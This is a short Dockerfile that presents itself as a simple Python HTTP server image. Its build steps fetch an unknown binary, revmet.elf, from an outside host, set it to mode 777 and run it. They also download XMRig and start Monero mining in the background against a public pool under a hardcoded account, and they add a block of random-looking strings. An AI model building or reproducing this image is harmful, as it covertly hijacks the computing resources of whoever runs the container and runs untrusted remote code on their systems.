FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo RP7kJF0VyxsJirSalimoo6GvoUjO9Wzu 11ojnfiwl7oRMfnhrpQK22glmNJ3Zpdh Q7bSYUPsLUSY5XrsvXHSZdcCxQ16GPyI OtTXQKhkJM6Mq6f74zkp8xoE5moZW8cM b04VWG6M66FZm04t0PbzliA1lQEdZIAj sced3o07BsAznW0djUX1Beyxja9pn2Z7 QkThTfgFo9gBEortCubIayqgeVd2Z8vz EZH410LSFTtpDFHdjPLilG2NUpAVMnP5 i3r5OOxrRD1AnkmOwErtBNKaqFCzu5JR MjMkuAdOV0kuaIOMORhypwwwDpgc3IIT KpCosHYlqAJ5c4XhSL0v6UhNX0LhuCEN GPWnsflyYN1Ci3VCFGQd66wNoYgaQoJF DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]